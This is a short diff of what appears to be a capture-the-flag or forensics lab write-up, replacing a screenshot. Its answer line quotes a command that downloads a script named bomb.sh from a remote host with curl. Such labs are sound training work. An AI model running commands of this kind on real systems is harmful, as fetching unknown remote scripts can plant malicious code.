@@ -135,7 +135,8 @@ Since the `bomb.sh` file was no longer present on the file system, I investigate
 
 **Screenshot:**
 
-<img width="645" height="187" alt="image" src="https://github.com/user-attachments/assets/6e9683a5-a377-46d1-8478-d2eab279e736" />
+<img width="741" height="254" alt="image" src="https://github.com/user-attachments/assets/9d11c1bd-a5ae-4b9a-852c-f64ebf71a360" />
+
 
 #### Answer
 curl 10.10.158.38:8080/bomb.sh --output bomb.sh
